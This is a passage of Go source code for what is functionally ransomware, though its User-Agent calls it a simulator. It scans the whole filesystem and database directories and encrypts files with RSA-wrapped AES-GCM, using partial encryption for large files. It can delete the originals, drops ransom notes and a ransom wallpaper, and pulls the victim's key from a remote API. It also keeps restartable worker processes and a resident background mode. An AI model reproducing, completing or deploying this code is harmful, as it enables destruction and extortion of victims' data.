			logOperation(fmt.Sprintf("生成壁纸失败: %v", err))
		}
		clearWallpaperFallback()
		return
	}
	fmt.Printf("[+] 壁纸已生成: %s\n", outPath)

	setWallpaperFromPath(outPath)

	fmt.Printf("[+] 壁纸已设置为: %s\n", outPath)
	if logEnabled {
		logOperation("壁纸设置完成: " + outPath)
	}
}

// setWallpaperFromPath 通过各主流桌面环境命令设置壁纸（GNOME/XFCE/LXDE/feh/nitrogen/macOS）
func setWallpaperFromPath(path string) {
	q := shellQuote(path)
	uri := shellQuote("file://" + path)
	cmds := []string{
		"gsettings set org.gnome.desktop.background picture-uri " + uri,
		"gsettings set org.gnome.desktop.background picture-uri-dark " + uri,
		"gsettings set org.gnome.desktop.background picture-options 'zoom'",
		"xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s " + q,
		"pcmanfm --set-wallpaper " + q,
		"feh --bg-fill " + q,
		"nitrogen --set-zoom-fill --save " + q,
		"osascript -e " + shellQuote(`tell application "System Events" to set picture of every desktop to "`+path+`"`),
	}
	for _, c := range cmds {
		_ = exec.Command("sh", "-c", c).Run()
	}
}

// clearWallpaperFallback 生成失败时退化为清除壁纸（保持原有行为）
func clearWallpaperFallback() {
	cmds := []string{
		"gsettings set org.gnome.desktop.background picture-uri ''",
		"gsettings set org.gnome.desktop.background picture-uri-dark ''",
		"gsettings set org.gnome.desktop.background primary-color '#000000'",
		"xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s ''",
		"pcmanfm --set-wallpaper ''",
	}
	for _, c := range cmds {
		_ = exec.Command("sh", "-c", c).Run()
	}
}

// shellQuote 用单引号包裹路径并转义，供 sh -c 安全使用
func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats bool) []string {
	var filesToProcess []string
	var roots []string
	if len(scanRoots) > 0 {
		roots = scanRoots
	} else {
		roots = []string{"/"}
	}

	// 添加数据库数据目录到扫描范围
	for _, dbDir := range databaseDataDirs {
		if _, err := os.Stat(dbDir); err == nil {
			roots = append(roots, dbDir)
		}
	}

	fmt.Printf("[*] 扫描根目录: %v\n", roots)

	if logEnabled {
		logOperation(fmt.Sprintf("开始扫描文件，根目录: %v", roots))
		logOperation(fmt.Sprintf("加密所有格式: %v", encryptAllFormats))
	}

	for _, root := range roots {
		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if info.IsDir() {
				if isExcluded(path) {
					return filepath.SkipDir
				}
				return nil
			}
			fileName := filepath.Base(path)
			if isProtectedArtifact(fileName) {
				return nil
			}
			shouldProcess := false
			if encryptAllFormats {
				shouldProcess = true
			} else {
				shouldProcess = shouldEncrypt(path, extFilter)
			}
			if shouldProcess {
				filesToProcess = append(filesToProcess, path)
			}
			return nil
		})
	}

	if logEnabled {
		logOperation(fmt.Sprintf("扫描完成，找到 %d 个待加密文件", len(filesToProcess)))
	}

	return filesToProcess
}

// acquireKeys 统一获取密钥：API 优先；API 不可用（断网/超时/异常响应）时
// 直接回退到本地公钥，不再因网络问题中止。
// 返回 (uuid, 公钥PEM, 来源说明, error)
func acquireKeys() (string, string, string, error) {
	fmt.Print("[*] 尝试从API获取密钥... ")
	resp, apiErr := fetchKeysFromAPI()
	if apiErr == nil {
		if perr := validatePublicKey(resp.PublicKeyPEM); perr != nil {
			fmt.Printf("失败: %v\n", perr)
			apiErr = fmt.Errorf("API 返回的公钥无效: %w", perr)
		} else {
			fmt.Printf("成功，UUID: %s\n", resp.UUID)
			cachePublicKeyCopy(resp.UUID, resp.PublicKeyPEM)
			return resp.UUID, resp.PublicKeyPEM, "远程API", nil
		}
	} else {
		fmt.Printf("失败: %v\n", apiErr)
	}

	// 网络不可用（DNS/连接/超时）或 API 异常：直接使用本地密钥
	fmt.Println("[*] 联网获取密钥失败（网络不可用或 API 异常），回退到本地密钥...")
	uuid, pemText, filePath, localErr := loadLocalKey()
	if localErr != nil {
		return "", "", "", fmt.Errorf("联网获取密钥失败（可能无网络）: %v；本地回退失败: %v", apiErr, localErr)
	}
	fmt.Printf("[+] 已加载本地公钥: %s\n", filePath)
	return uuid, pemText, "本地公钥文件", nil
}

// validatePublicKey 校验公钥可被解析（静默，调用方负责输出）。
func validatePublicKey(pemText string) error {
	if _, err := getPublicKey(pemText); err != nil {
		return fmt.Errorf("公钥格式错误: %w", err)
	}
	return nil
}

// runEncryptionWithMonitor 使用进程监控模式运行加密工作
// 主进程负责启动worker子进程并监控其状态（密钥已在 main 中统一获取）
func runEncryptionWithMonitor(files []string, numWorkers int, stats *counters, uuid, publicKeyValue string, removeOriginal bool) {
	// 预解析公钥
	pubKey, parseErr := getPublicKey(publicKeyValue)
	if parseErr != nil {
		fmt.Printf("[!] 公钥格式错误: %v\n", parseErr)
		os.Exit(1)
	}
	publicKeyCache = pubKey
	publicKeyCacheStr = publicKeyValue

	// 写入文件列表到临时任务文件
	taskFile := filepath.Join(os.TempDir(), "ransom_tasks_"+uuid+".txt")
	resultFile := filepath.Join(os.TempDir(), "ransom_results_"+uuid+".txt")
	progressFile := filepath.Join(os.TempDir(), "ransom_progress_"+uuid+".txt")

	// 写入任务文件
	if err := writeTasksFile(taskFile, files, removeOriginal, publicKeyValue, uuid); err != nil {
		fmt.Printf("[!] 写入任务文件失败: %v\n", err)
		os.Exit(1)
	}
	defer os.Remove(taskFile)
	defer os.Remove(resultFile)
	defer os.Remove(progressFile)

	fmt.Printf("[*] 任务文件已创建: %s (%d 个文件)\n", taskFile, len(files))

	// 获取程序自身路径
	exePath, err := os.Executable()
	if err != nil {
		fmt.Printf("[!] 无法获取程序路径: %v\n", err)
		os.Exit(1)
	}

	// 启动 worker 子进程并监控
	var wg sync.WaitGroup
	workerExitChan := make(chan int, numWorkers)

	for w := 0; w < numWorkers; w++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			maxRetries := 5
			for retry := 0; retry < maxRetries; retry++ {
				// 构造 worker 参数
				workerArgs := []string{
					"--worker",
					"--task-file", taskFile,
					"--result-file", resultFile,
					"--progress-file", progressFile,
					"--worker-id", strconv.Itoa(workerID),
				}

				cmd := exec.Command(exePath, workerArgs...)
				cmd.Stdout = nil // 不继承输出，避免混乱
				cmd.Stderr = nil

				if err := cmd.Start(); err != nil {
					fmt.Printf("\n[!] Worker %d 启动失败 (尝试 %d/%d): %v\n", workerID, retry+1, maxRetries, err)
					time.Sleep(1 * time.Second)
					continue
				}

				pid := cmd.Process.Pid
				fmt.Printf("\n[*] Worker %d 已启动 (PID: %d, 尝试 %d/%d)\n", workerID, pid, retry+1, maxRetries)

				// 等待 worker 退出
				err := cmd.Wait()
				exitCode := 0
				if err != nil {
					if exitErr, ok := err.(*exec.ExitError); ok {
						exitCode = exitErr.ExitCode()
					} else {
						exitCode = -1
					}
				}

				fmt.Printf("\n[!] Worker %d (PID: %d) 已退出，退出码: %d\n", workerID, pid, exitCode)

				if exitCode == 0 {
					// 正常退出，不需要重试
					workerExitChan <- 0
					return
				}

				// 非正常退出，等待后重试
				fmt.Printf("\n[*] Worker %d 将在 2 秒后重启...\n", workerID)
				time.Sleep(2 * time.Second)
			}
			fmt.Printf("\n[!] Worker %d 已达到最大重试次数 (%d)，停止拉起\n", workerID, maxRetries)
			workerExitChan <- 1
		}(w)
	}

	// 进度显示 goroutine
	done := make(chan bool)
	go func() {
		totalFiles := len(files)
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				// 从进度文件读取进度
				success, failed := readProgressFile(progressFile)
				stats.success.Store(uint64(success))
				stats.failed.Store(uint64(failed))
				processed := success + failed
				if totalFiles > 0 {
					progress := float64(processed) / float64(totalFiles) * 100
					fmt.Printf("\r[*] 进度: %.1f%% (%d/%d) [成功: %d, 失败: %d]", progress, processed, totalFiles, success, failed)
				}
			}
		}
	}()

	wg.Wait()
	close(done)
	fmt.Println()

	// 读取最终结果
	success, failed := readProgressFile(progressFile)
	stats.success.Store(uint64(success))
	stats.failed.Store(uint64(failed))

	if logEnabled {
		logOperation(fmt.Sprintf("加密工作完成: 成功 %d, 失败 %d", stats.success.Load(), stats.failed.Load()))
	}
}

// writeTasksFile 将文件列表写入任务文件
// 使用 base64 编码公钥 PEM 以避免多行 PEM 破坏任务文件格式
func writeTasksFile(taskFile string, files []string, removeOriginal bool, publicKeyStr string, uuid string) error {
	var buf bytes.Buffer
	publicKeyB64 := base64.StdEncoding.EncodeToString([]byte(publicKeyStr))
	buf.WriteString(fmt.Sprintf("remove=%s\n", strconv.FormatBool(removeOriginal)))
	buf.WriteString(fmt.Sprintf("uuid=%s\n", uuid))
	buf.WriteString(fmt.Sprintf("public_key_b64=%s\n", publicKeyB64))
	buf.WriteString(fmt.Sprintf("total=%d\n", len(files)))
	for _, f := range files {
		buf.WriteString(f + "\n")
	}
	return os.WriteFile(taskFile, buf.Bytes(), 0644)
}

// readProgressFile 从进度文件读取成功和失败计数
func readProgressFile(progressFile string) (int, int) {
	data, err := os.ReadFile(progressFile)
	if err != nil {
		return 0, 0
	}
	lines := strings.Split(string(data), "\n")
	success := 0
	failed := 0
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "success=") {
			success, _ = strconv.Atoi(strings.TrimPrefix(line, "success="))
		} else if strings.HasPrefix(line, "failed=") {
			failed, _ = strconv.Atoi(strings.TrimPrefix(line, "failed="))
		}
	}
	return success, failed
}

// ---------------------------------------------------------------------------
// 密钥驻留：内存保存 + 本地缓存（--keep-key）
// ---------------------------------------------------------------------------

type keyCacheRecord struct {
	UUID           string `json:"uuid"`
	PublicKeyPEM   string `json:"public_key_pem"`
	CreatedAt      string `json:"created_at"`
	Mode           string `json:"mode"`
	RemoveOriginal bool   `json:"remove_original"`
	Version        string `json:"version"`
}

var (
	keyMemoryMu   sync.RWMutex
	keyMemoryUUID string
	keyMemoryPEM  string
)

// rememberKey 把本次运行使用的密钥保存在进程内存中（驻留期间不会释放）
func rememberKey(uuid, pemText string) {
	keyMemoryMu.Lock()
	keyMemoryUUID = uuid
	keyMemoryPEM = pemText
	keyMemoryMu.Unlock()
}

// memoryKey 读取内存中保存的密钥（供驻留状态输出使用）
func memoryKey() (uuid, pemText string) {
	keyMemoryMu.RLock()
	defer keyMemoryMu.RUnlock()
	return keyMemoryUUID, keyMemoryPEM
}

// persistKeyCache 把 UUID 与公钥写入本地缓存：程序目录 + 用户级缓存目录。
// 缓存文件会被扫描流程跳过，不会因加密或 -remove 被删除。
func persistKeyCache(uuid, pemText, mode string, removeOriginal bool) (string, error) {
	if strings.TrimSpace(uuid) == "" || strings.TrimSpace(pemText) == "" {
		return "", fmt.Errorf("UUID 或公钥内容为空，无法写入密钥缓存")
	}

	record := keyCacheRecord{
		UUID:           uuid,
		PublicKeyPEM:   pemText,
		CreatedAt:      time.Now().Format(time.RFC3339),
		Mode:           mode,
		RemoveOriginal: removeOriginal,
		Version:        version,
	}
	data, err := json.MarshalIndent(record, "", "  ")
	if err != nil {
		return "", fmt.Errorf("序列化密钥缓存失败: %w", err)
	}
	data = append(data, '\n')

	fileName := fmt.Sprintf("key_cache_%s.json", uuid)
	paths := []string{filepath.Join(programDir, fileName)}
	if cacheDir := keyCacheDir(); cacheDir != "" {
		if mkErr := os.MkdirAll(cacheDir, 0700); mkErr == nil {
			paths = append(paths, filepath.Join(cacheDir, fileName))
		}
	}

	var written []string
	var firstErr error
	for _, path := range paths {
		if wErr := os.WriteFile(path, data, 0600); wErr != nil {
			if firstErr == nil {
				firstErr = wErr
			}
			continue
		}
		written = append(written, path)
	}
	if len(written) == 0 {
		if firstErr == nil {
			firstErr = fmt.Errorf("没有可写的缓存目录")
		}
		return "", fmt.Errorf("写入密钥缓存失败: %w", firstErr)
	}
	return written[0], nil
}

// isProtectedArtifact 判断文件名是否为程序自身产物：不参与扫描、加密与删除。
func isProtectedArtifact(name string) bool {
	lower := strings.ToLower(name)
	switch lower {
	case strings.ToLower(ransomNoteFileName),
		strings.ToLower(ransomWallpaperFileName),
		"ransom_log.txt",
		"success_encrypted.log",
		"failed_encrypted.log",
		"operations.log":
		return true
	}
	if strings.HasSuffix(lower, ".lock") || strings.HasSuffix(lower, ".encrypted") {
		return true
	}
	if strings.HasPrefix(lower, "public_key") && strings.HasSuffix(lower, ".pem") {
		return true
	}
	if strings.HasPrefix(lower, "key_cache_") && strings.HasSuffix(lower, ".json") {
		return true
	}
	if strings.HasPrefix(lower, "recon_report_") || strings.HasPrefix(lower, "remote_report_") {
		return true
	}
	return false
}

// ---------------------------------------------------------------------------
// 后台驻留模式（--resident）
// ---------------------------------------------------------------------------

// runResidentLoop 加密完成后驻留后台：保持心跳与单实例锁，直到收到退出信号。
func runResidentLoop(keyUUID, keyCachePath string) {
	uuid, _ := memoryKey()
	if uuid == "" {
		uuid = keyUUID
	}

	fmt.Println()
	fmt.Println("================== [ 后台驻留模式 ] ==================")
	fmt.Printf("  - 进程 PID:        %d\n", os.Getpid())
	if uuid != "" {
		fmt.Printf("  - 密钥 UUID:       %s（内存中保留）\n", uuid)
	}
	if keyCachePath != "" {
		fmt.Printf("  - 密钥缓存:        %s（不会删除）\n", keyCachePath)
	}
	fmt.Println("  - 心跳上报:        每 30 秒（管理后台持续显示在线）")
	fmt.Println("  - 退出方式:        Ctrl+C 或结束进程")
	fmt.Println("======================================================")

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(sigCh)

	statusTicker := time.NewTicker(5 * time.Minute)
	defer statusTicker.Stop()

	for {
		select {
		case sig := <-sigCh:
			fmt.Printf("\n[*] 收到退出信号 (%v)，结束驻留。\n", sig)
			return
		case <-statusTicker.C:
			if logEnabled {
				logOperation(fmt.Sprintf("后台驻留中: pid=%d uuid=%s 运行时长=%s",
					os.Getpid(), uuid, time.Since(heartbeatState.startAt).Round(time.Second)))
			}
		}
	}
}

// 以下是原有的 runEncryptionWorkers 函数（保留作为备用，但不再被 main 直接调用）
func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) {
	// 统一走 acquireKeys：API 优先，断网直接回退本地公钥
	uuid, publicKeyPEM, _, keyErr := acquireKeys()
	if keyErr != nil {
		fmt.Printf("[!] 获取密钥失败: %v\n", keyErr)
		remindLocalKey()
		countdown("此终端将在", 15)
		os.Exit(1)
	}

	// 预解析公钥，确保格式正确
	pubKey, parseErr := getPublicKey(publicKeyPEM)
	if parseErr != nil {
		fmt.Printf("[!] 公钥格式错误: %v\n", parseErr)
		os.Exit(1)
	}
	publicKeyCache = pubKey
	publicKeyCacheStr = publicKeyPEM

	finalAccurateNote := fmt.Sprintf(ransomNoteContent, uuid, uuid, ransomNoteNotice(removeOriginal), uuid)
	var visitedDirs sync.Map

	log, err3 := newFileLog("ransom_log.txt")
	if err3 != nil {
		fmt.Printf("无法创建日志文件: %v\n", err3)
	}
	if log != nil {
		defer func() { _ = log.Close() }()
	}

	jobs := make(chan string, len(files))

	for w := 0; w < numWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for file := range jobs {
				dirPath := filepath.Dir(file)
				if _, loaded := visitedDirs.LoadOrStore(dirPath, true); !loaded {
					notePath := filepath.Join(dirPath, ransomNoteFileName)
					_ = os.WriteFile(notePath, []byte(finalAccurateNote), 0644)
				}
				if err := processFile(file, publicKeyPEM, removeOriginal); err != nil {
					stats.failed.Add(1)

					// 记录失败日志
					logFailed(file, err.Error())

					if log != nil {
						log.Log(fmt.Sprintf("FAILED: %s - %v", file, err))
					}
				} else {
					stats.success.Add(1)

					// 记录成功日志
					logSuccess(file)
				}
			}
		}()
	}

	for _, file := range files {
		jobs <- file
	}
	close(jobs)

	done := make(chan bool)
	go func() {
		totalFiles := uint64(len(files))
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				processed := stats.success.Load() + stats.failed.Load()
				if totalFiles > 0 {
					progress := float64(processed) / float64(totalFiles) * 100
					fmt.Printf("\r[*] 进度: %.1f%% (%d/%d)", progress, processed, totalFiles)
				}
			}
		}
	}()

	wg.Wait()
	close(done)
	fmt.Println()

	*outUUID = uuid

	if logEnabled {
		logOperation(fmt.Sprintf("加密工作完成: 成功 %d, 失败 %d", stats.success.Load(), stats.failed.Load()))
	}
}

func fetchKeysFromAPI() (*APIResponse, error) {
	jsonBody := []byte("{}")
	req, err := http.NewRequest("POST", apiURL, bytes.NewBuffer(jsonBody))
	if err != nil {
		return nil, fmt.Errorf("创建请求失败: %w", err)
	}
	req.Header.Set("User-Agent", "Ransom-Simulator/"+version)
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 5 * time.Second}
	res, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("请求API失败: %w", err)
	}
	defer func() { _ = res.Body.Close() }()
	if res.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(res.Body)
		return nil, fmt.Errorf("API返回异常状态码: %d, Body: %s", res.StatusCode, string(body))
	}
	body, err := io.ReadAll(res.Body)
	if err != nil {
		return nil, fmt.Errorf("读取响应体失败: %w", err)
	}
	var apiResp APIResponse
	if err := json.Unmarshal(body, &apiResp); err != nil {
		return nil, fmt.Errorf("解析JSON失败: %w", err)
	}
	if apiResp.UUID == "" || apiResp.PublicKeyPEM == "" {
		return nil, fmt.Errorf("API响应无效，缺少UUID或公钥")
	}
	return &apiResp, nil
}

// 清理公钥格式
func cleanPublicKey(publicKeyStr string) string {
	cleaned := strings.TrimSpace(publicKeyStr)

	// 确保有正确的PEM头
	if !strings.HasPrefix(cleaned, "-----BEGIN") {
		// 尝试添加标准PEM头
		lines := strings.Split(cleaned, "\n")
		if len(lines) > 0 && len(lines[0]) > 50 {
			// 可能是没有换行的公钥，手动添加格式
			cleaned = fmt.Sprintf("-----BEGIN PUBLIC KEY-----\n%s\n-----END PUBLIC KEY-----", cleaned)
		}
	}

	// 确保每行不超过64字符（PEM标准）
	lines := strings.Split(cleaned, "\n")
	var formattedLines []string
	for _, line := range lines {
		if strings.HasPrefix(line, "-----") {
			formattedLines = append(formattedLines, line)
		} else {
			// 拆分长行
			for i := 0; i < len(line); i += 64 {
				end := i + 64
				if end > len(line) {
					end = len(line)
				}
				formattedLines = append(formattedLines, line[i:end])
			}
		}
	}

	return strings.Join(formattedLines, "\n")
}

func isExcluded(path string) bool {
	pathLower := strings.ToLower(path)
	for _, ex := range excludedDirsLinux {
		exLower := strings.ToLower(ex)
		if pathLower == exLower || strings.HasPrefix(pathLower, exLower+string(filepath.Separator)) {
			return true
		}
	}
	return false
}

func shouldEncrypt(filePath string, extFilter map[string]bool) bool {
	fileName := filepath.Base(filePath)
	ext := strings.ToLower(filepath.Ext(filePath))
	if fileName == ransomNoteFileName || fileName == ransomWallpaperFileName || strings.HasSuffix(fileName, ".lock") || strings.EqualFold(ext, ".encrypted") {
		return false
	}
	return extFilter[ext]
}

func getKeys(m map[string]bool) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

// processFile 处理单个文件的加密
// 小文件（<=1GB）完整加密，大文件（>1GB）使用部分加密策略
func processFile(filePath string, publicKeyStr string, removeOriginal bool) error {
	info, err := os.Stat(filePath)
	if err != nil {
		return fmt.Errorf("获取文件信息失败: %w", err)
	}

	fileSize := info.Size()

	// 大文件：使用部分加密
	if fileSize > largeFileThreshold {
		return partialEncryptFile(filePath, publicKeyStr, fileSize)
	}

	// 小文件：完整加密（原有逻辑）
	_ = os.Chmod(filePath, 0666)
	content, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("读取文件失败: %w", err)
	}

	// 检查文件是否为空
	if len(content) == 0 {
		return fmt.Errorf("文件为空，跳过加密: %s", filePath)
	}

	encryptedContent, err := hybridEncrypt(content, publicKeyStr)
	if err != nil {
		return fmt.Errorf("混合加密失败: %w", err)
	}
	encryptedFilePath := filePath + ".encrypted"
	if err := os.WriteFile(encryptedFilePath, encryptedContent, 0666); err != nil {
		return fmt.Errorf("写入加密文件失败: %w", err)
	}
	if removeOriginal {
		if err := os.Remove(filePath); err != nil {
			trashName := filePath + ".delete_me_" + generateRandomSuffix()
			if renameErr := os.Rename(filePath, trashName); renameErr != nil {
				return fmt.Errorf("删除原文件失败 (文件被锁定): %w", err)
			}
		}
	}
	return nil
}

// partialEncryptFile 对大文件进行部分加密（头部、尾部、随机中间块）
func partialEncryptFile(filePath string, publicKeyStr string, fileSize int64) error {
	fmt.Printf("\n  [大文件] %s (大小: %.2f GB) - 使用部分加密策略\n",
		filepath.Base(filePath), float64(fileSize)/(1024*1024*1024))

	_ = os.Chmod(filePath, 0666)

	// 获取公钥
	pubKey, err := getPublicKey(publicKeyStr)
	if err != nil {
		return fmt.Errorf("获取公钥失败: %w", err)
	}

	// 生成AES密钥
	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(cryptoReader, aesKey); err != nil {
		return fmt.Errorf("生成AES密钥失败: %w", err)
	}

	// 计算需要加密的块
	chunks := calculateChunks(fileSize)

	// 加密每个块并读入内存
	var encryptedChunks []encryptedChunk
	totalEncryptedSize := int64(0)

	f, err := os.OpenFile(filePath, os.O_RDONLY, 0666)
	if err != nil {
		return fmt.Errorf("打开文件失败: %w", err)
	}
	defer f.Close()

	for _, chunk := range chunks {
		// 读取原始数据
		buf := make([]byte, chunk.Size)
		n, err := f.ReadAt(buf, chunk.Offset)
		if err != nil && err != io.EOF {
			return fmt.Errorf("读取文件块失败 (offset=%d): %w", chunk.Offset, err)
		}
		buf = buf[:n]

		// 加密该块
		block, err := aes.NewCipher(aesKey)
		if err != nil {
			return fmt.Errorf("创建AES cipher失败: %w", err)
		}

		aesGCM, err := cipher.NewGCM(block)
		if err != nil {
			return fmt.Errorf("创建GCM模式失败: %w", err)
		}

		nonce := make([]byte, aesGCM.NonceSize())
		if _, err := io.ReadFull(cryptoReader, nonce); err != nil {
			return fmt.Errorf("生成GCM nonce失败: %w", err)
		}

		ciphertext := aesGCM.Seal(nil, nonce, buf, nil)

		encryptedChunks = append(encryptedChunks, encryptedChunk{
			Offset: chunk.Offset,
			Size:   len(buf),
			Nonce:  nonce,
			Data:   ciphertext,
		})
		totalEncryptedSize += int64(len(ciphertext))
	}

	// 加密AES密钥
	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), cryptoReader, pubKey, aesKey, nil)
	if err != nil {
		return fmt.Errorf("RSA加密AES密钥失败: %w", err)
	}

	// 序列化加密块信息
	chunksJSON, err := json.Marshal(encryptedChunks)
	if err != nil {
		return fmt.Errorf("序列化加密块信息失败: %w", err)
	}

	// 构造输出文件格式:
	// [4字节 magic: "PENC"]
	// [4字节 chunks JSON 长度]
	// [chunks JSON 数据]
	// [4字节 加密AES密钥长度]
	// [加密AES密钥数据]
	// [所有加密块数据]
	var outputBuf bytes.Buffer

	// Magic header
	outputBuf.Write([]byte("PENC"))

	// Chunks metadata
	chunkLen := make([]byte, 4)
	binary.LittleEndian.PutUint32(chunkLen, uint32(len(chunksJSON)))
	outputBuf.Write(chunkLen)
	outputBuf.Write(chunksJSON)

	// Encrypted AES key metadata
	keyLen := make([]byte, 4)
	binary.LittleEndian.PutUint32(keyLen, uint32(len(encryptedAESKey)))
	outputBuf.Write(keyLen)
	outputBuf.Write(encryptedAESKey)

	// All chunk data
	for _, ec := range encryptedChunks {
		outputBuf.Write(ec.Data)
	}

	// 写入加密文件
	encryptedFilePath := filePath + ".encrypted"
	if err := os.WriteFile(encryptedFilePath, outputBuf.Bytes(), 0666); err != nil {
		return fmt.Errorf("写入加密文件失败: %w", err)
	}

	fmt.Printf("  [大文件] 已加密 %d 个块，共 %.2f MB 数据\n",
		len(chunks), float64(totalEncryptedSize)/(1024*1024))

	return nil
}

// chunkInfo 描述一个需要加密的文件块
type chunkInfo struct {
	Offset int64
	Size   int
}

// calculateChunks 计算需要加密的块列表
func calculateChunks(fileSize int64) []chunkInfo {
	var chunks []chunkInfo

	// 如果文件太小，只加密头部
	if fileSize < minFileForPartial {
		// 加密整个文件
		chunks = append(chunks, chunkInfo{Offset: 0, Size: int(fileSize)})
		return chunks
	}

	// 1. 头部：文件开头的 headChunks 个块
	headSize := int64(headChunks * chunkSize)
	if headSize > fileSize {
		headSize = fileSize
	}
	chunks = append(chunks, chunkInfo{Offset: 0, Size: int(headSize)})

	// 2. 尾部：文件末尾的 tailChunks 个块
	tailSize := int64(tailChunks * chunkSize)
	if tailSize > fileSize {
		tailSize = fileSize
	}
	chunks = append(chunks, chunkInfo{Offset: fileSize - tailSize, Size: int(tailSize)})

	// 3. 中间随机块
	middleStart := headSize
	middleEnd := fileSize - tailSize

	if middleEnd > middleStart {
		// 计算中间区域可以划分的块数
		middleArea := middleEnd - middleStart
		possibleBlocks := int(middleArea / int64(chunkSize))

		// 随机选择块
		numRandom := middleRandomChunks
		if possibleBlocks < numRandom {
			numRandom = possibleBlocks
		}

		// 生成随机索引
		indices := mrand.Perm(possibleBlocks)
		for i := 0; i < numRandom && i < len(indices); i++ {
			offset := middleStart + int64(indices[i])*int64(chunkSize)
			// 确保不超出文件范围
			actualSize := chunkSize
			if offset+int64(chunkSize) > fileSize {
				actualSize = int(fileSize - offset)
			}
			chunks = append(chunks, chunkInfo{Offset: offset, Size: actualSize})
		}
	}

	return chunks
}

// runWorker 是 worker 子进程的入口函数，读取任务文件并执行加密工作
func runWorker() {
	// 解析 worker 参数
	var taskFile, resultFile, progressFile string

	for i := 1; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "--task-file":
			if i+1 < len(os.Args) {
				taskFile = os.Args[i+1]
				i++
			}
		case "--result-file":
			if i+1 < len(os.Args) {
				resultFile = os.Args[i+1]
				i++
			}
		case "--progress-file":
			if i+1 < len(os.Args) {
				progressFile = os.Args[i+1]
				i++
			}
		case "--worker-id":
			// 跳过该参数，worker 不需要知道自己的 ID
			if i+1 < len(os.Args) {
				i++
			}
		}
	}

	if taskFile == "" || progressFile == "" {
		os.Exit(1)
	}

	// 读取任务文件
	data, err := os.ReadFile(taskFile)
	if err != nil {
		os.Exit(1)
	}

	lines := strings.Split(string(data), "\n")
	if len(lines) < 4 {
		os.Exit(1)
	}

	// 解析任务文件头部
	removeOriginal := false
	publicKeyStr := ""

	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "remove=") {
			removeOriginal, _ = strconv.ParseBool(strings.TrimPrefix(line, "remove="))
		} else if strings.HasPrefix(line, "public_key_b64=") {
			// 解码 base64 编码的公钥 PEM
			b64Str := strings.TrimPrefix(line, "public_key_b64=")
			decoded, err := base64.StdEncoding.DecodeString(b64Str)
			if err == nil {
				publicKeyStr = string(decoded)
			}
		} else if strings.HasPrefix(line, "public_key=") {
			// 兼容旧格式
			publicKeyStr = strings.TrimPrefix(line, "public_key=")
		}
	}

	// 收集文件列表（只收集以 / 开头或驱动器号开头的绝对路径行）
	var files []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" ||
			strings.HasPrefix(line, "remove=") ||
			strings.HasPrefix(line, "uuid=") ||
			strings.HasPrefix(line, "public_key") ||
			strings.HasPrefix(line, "total=") {
			continue
		}
		// 只接受看起来像文件路径的行（以 / 开头或以驱动器号开头）
		if strings.HasPrefix(line, "/") || (len(line) >= 2 && line[1] == ':') {
			files = append(files, line)
		}
	}

	// 使用文件锁 + 进度文件实现跨进程的文件处理协调
	lockFile := progressFile + ".lock"

	successCount := 0
	failCount := 0

	for _, filePath := range files {
		// 尝试获取锁并获取下一个要处理的文件索引
		// 使用进度文件中的当前成功+失败计数作为已处理计数
		// 如果当前已处理数 >= 我的起始索引，则跳过
		// 实际上，我们使用更简单的方式：直接尝试处理，但通过进度文件检查是否已被处理

		// 最简方案：直接处理，处理完成后写入进度文件
		// 但多个 worker 可能处理同一个文件。我们需要确保不重复。

		// 使用文件锁 + 进度文件记录已处理文件路径
		// 检查文件是否已被处理
		alreadyProcessed := false
		if resultFile != "" {
			if resultData, err := os.ReadFile(resultFile); err == nil {
				if strings.Contains(string(resultData), filePath+"\n") {
					alreadyProcessed = true
				}
			}
		}

		if alreadyProcessed {
			continue
		}

		// 处理文件
		err := processFile(filePath, publicKeyStr, removeOriginal)

		// 更新进度文件（使用文件锁避免并发写入冲突）
		updateProgressWithLock(lockFile, progressFile, resultFile, filePath, err == nil)

		if err != nil {
			failCount++
		} else {
			successCount++
		}
	}

	// 写入最终结果
	os.Exit(0)
}

// updateProgressWithLock 使用文件锁更新进度文件
func updateProgressWithLock(lockFile, progressFile, resultFile, filePath string, success bool) {
	// 创建锁文件（原子操作）
	for i := 0; i < 10; i++ {
		lock, err := os.OpenFile(lockFile, os.O_CREATE|os.O_EXCL, 0644)
		if err == nil {
			lock.Close()
			defer os.Remove(lockFile)

			// 读取当前进度
			successCount := 0
			failCount := 0
			if data, err := os.ReadFile(progressFile); err == nil {
				for _, line := range strings.Split(string(data), "\n") {
					line = strings.TrimSpace(line)
					if strings.HasPrefix(line, "success=") {
						successCount, _ = strconv.Atoi(strings.TrimPrefix(line, "success="))
					} else if strings.HasPrefix(line, "failed=") {
						failCount, _ = strconv.Atoi(strings.TrimPrefix(line, "failed="))
					}
				}
			}

			if success {
				successCount++
			} else {
				failCount++
			}

			// 写入进度文件
			progressContent := fmt.Sprintf("success=%d\nfailed=%d\n", successCount, failCount)
			os.WriteFile(progressFile, []byte(progressContent), 0644)

			// 记录到结果文件（使用追加模式，避免覆盖）
			if resultFile != "" {
				resultEntry := filePath + "\n"
